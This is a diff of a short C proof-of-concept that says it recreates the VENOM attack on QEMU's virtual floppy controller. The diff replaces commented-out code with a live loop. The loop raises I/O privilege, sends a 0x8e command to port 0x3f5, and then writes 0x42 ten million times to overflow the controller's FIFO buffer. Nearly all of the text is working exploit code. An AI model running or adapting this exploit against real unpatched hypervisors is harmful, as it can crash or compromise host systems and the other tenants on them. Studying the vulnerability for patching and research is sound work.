@@ -7,17 +7,23 @@ It's aim is to exploit and recreate possible Venom attack on QEMU before patch
 #define RDID 0x0a
 #define SPC_COMMAND 0x8e
 #define MAX_COUNT  50000000
-void main(void){
-        iopl(3);
-        ioperm(0x3f5, 1, 1);
+int main(void){
+        // iopl(3);
+        // ioperm(0x3f5, 1, 1);
 	// printf("write spc_command to port\n");
-        outb(SPC_COMMAND, FIFO);
+        // outb(SPC_COMMAND, FIFO);
         // printf("write spc_command to portaa\n");
-        int i,j;
-        j = 0;
+        // int i,j;
+        // j = 0;
         // printf("into loop\n");
-        for(i=0; i<MAX_COUNT; i++ ){
-                outb(0x42,0x3f5);
-        }
+        // for(i=0; i<MAX_COUNT; i++ ){
+                // outb(0x42,0x3f5);
+        // }
+
+        int i;
+         iopl(3);
+         outb(0x8e,0x3f5); /* READ ID */
+         for (i=0;i<10000000;i++)
+                  outb(0x42,0x3f5); /* push */
 
 }
